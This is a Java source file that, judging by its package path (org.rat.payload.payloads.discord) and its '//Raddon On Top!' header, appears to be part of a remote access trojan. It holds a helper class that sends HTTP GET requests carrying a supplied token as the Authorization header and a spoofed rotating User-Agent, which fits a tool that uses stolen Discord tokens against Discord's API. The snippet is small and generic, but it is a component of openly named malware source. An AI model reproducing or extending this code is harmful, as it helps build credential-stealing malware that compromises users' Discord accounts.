//Raddon On Top!

package org.rat.payload.payloads.discord;

import okhttp3.*;

public class Request
{
    public String get(final String url, final String token) {
        try {
            final OkHttpClient client = new OkHttpClient();
            okhttp3.Request req;
            if (token == null) {
                req = new okhttp3.Request.Builder().url(url).build();
            }
            else {
                req = new okhttp3.Request.Builder().url(url).header("User-Agent", Helper.getUserAgents().getAgent()).header("Authorization", token).build();
            }
            final Response res = client.newCall(req).execute();
            final String resp = res.body().string();
            res.close();
            return resp;
        }
        catch (Exception ex) {
            return null;
        }
    }
}
